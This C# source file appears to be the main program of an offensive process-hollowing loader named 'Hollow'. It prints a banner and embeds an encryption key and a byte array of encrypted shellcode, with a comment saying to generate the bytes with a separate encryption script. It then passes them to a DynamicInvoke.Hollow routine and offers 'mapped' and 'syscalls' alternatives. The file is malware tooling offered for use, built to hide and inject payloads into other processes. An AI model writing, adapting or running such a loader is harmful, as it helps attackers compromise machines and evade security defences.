using System;

namespace Hollow
{
    class Program
    {
        static void Main(String[] args)
        {
            Console.WriteLine(@"
.------..------..------..------..------..------.
|M.--. ||A.--. ||R.--. ||A.--. ||C.--. ||A.--. | Shaky
| (\/) || (\/) || :(): || (\/) || :/\: || (\/) |    Shaky
| :\/: || :\/: || ()() || :\/: || :\/: || :\/: |        Baby 
| '--'M|| '--'A|| '--'R|| '--'A|| '--'C|| '--'A|           *music*
`------'`------'`------'`------'`------'`------'
");

            string k = "flareon223";
            // Place encrypted shellcode here
            // Obtain by running encryption.py with the same key as above
            byte[] encBytes = new byte[] { 0x9a, 0x24, 0xe2, 0x96, 0x95, 0x87, 0xae, 0x32, 0x32, 0x33, 0x27, 0x3d, 0x20, 0x22, 0x37, 0x3e, 0x38, 0x7a, 0x3, 0xe1, 0x3, 0x24, 0xea, 0x20, 0x5, 0x27, 0xe5, 0x60, 0x2a, 0x7b, 0xed, 0x3e, 0x41, 0x3a, 0xee, 0x1d, 0x3e, 0x7a, 0x3d, 0x84, 0x2c, 0x26, 0x2c, 0x43, 0xac, 0x27, 0x5f, 0xf2, 0x9e, 0xf, 0x7, 0x10, 0x63, 0x5e, 0x45, 0x2e, 0xaf, 0xfb, 0x3f, 0x72, 0x67, 0xad, 0x83, 0x9f, 0x37, 0x2e, 0x3f, 0x7a, 0xb9, 0x61, 0x46, 0xe7, 0x23, 0x4e, 0x2d, 0x6e, 0xbe, 0xb9, 0xb2, 0xbb, 0x66, 0x6c, 0x61, 0x3a, 0xe0, 0xaf, 0x1a, 0x55, 0x7a, 0x32, 0xb6, 0x3c, 0xea, 0x3a, 0x7d, 0x2b, 0xe5, 0x72, 0x12, 0x7a, 0x67, 0xbc, 0x82, 0x24, 0x2d, 0x90, 0xa7, 0x73, 0xb9, 0x7, 0xee, 0x24, 0x60, 0xa4, 0x28, 0x5e, 0xa7, 0x7a, 0x3, 0xf3, 0xca, 0x2d, 0xa0, 0xbb, 0x68, 0x2e, 0x6f, 0xf3, 0xa, 0xd3, 0x13, 0x9d, 0x2d, 0x71, 0x29, 0x4b, 0x66, 0x77, 0xb, 0xe2, 0x13, 0xb4, 0x39, 0x36, 0xee, 0x2f, 0x4a, 0x7b, 0x33, 0xe3, 0x0, 0x2d, 0xea, 0x7e, 0x2d, 0x2b, 0xe5, 0x72, 0x2e, 0x7a, 0x67, 0xbc, 0x20, 0xf9, 0x61, 0xe7, 0x26, 0x33, 0xe2, 0x72, 0x3e, 0x2d, 0x39, 0x2c, 0x3c, 0x35, 0x2f, 0x6a, 0x73, 0x6a, 0x27, 0x36, 0x29, 0xf1, 0x89, 0x4f, 0x2f, 0x60, 0xcd, 0xd3, 0x3e, 0x2d, 0x38, 0x28, 0x2d, 0xe4, 0x7c, 0xdb, 0x65, 0xcc, 0x99, 0x93, 0x3c, 0x3a, 0xdf, 0x6e, 0x6e, 0x32, 0x32, 0x33, 0x66, 0x6c, 0x61, 0x3a, 0xe8, 0xe2, 0x6f, 0x33, 0x32, 0x33, 0x27, 0xd6, 0x50, 0xf9, 0xa, 0xe8, 0x91, 0xe7, 0x89, 0xc3, 0xd3, 0xce, 0x37, 0x33, 0xdf, 0xc9, 0xfb, 0x8f, 0xaf, 0xcc, 0xb3, 0x24, 0xe2, 0xb6, 0x4d, 0x53, 0x68, 0x4e, 0x38, 0xb3, 0x9d, 0x8c, 0x14, 0x77, 0xde, 0x28, 0x7d, 0x40, 0x5d, 0x59, 0x66, 0x35, 0x20, 0xfb, 0xbf, 0x90, 0xbb, 0x51, 0x53, 0x5f, 0x5, 0x42, 0x4, 0xa, 0x0, 0x6f };

            if (args.Length != 1)
            {
                Console.WriteLine("[!] Please specify a method [ dynamic | mapped | syscalls ]");
                Environment.Exit(1);
            }
            

            if (args[0] == "dynamic")
            {
                DynamicInvoke.Hollow(encBytes, k);
            }

        }
    }
}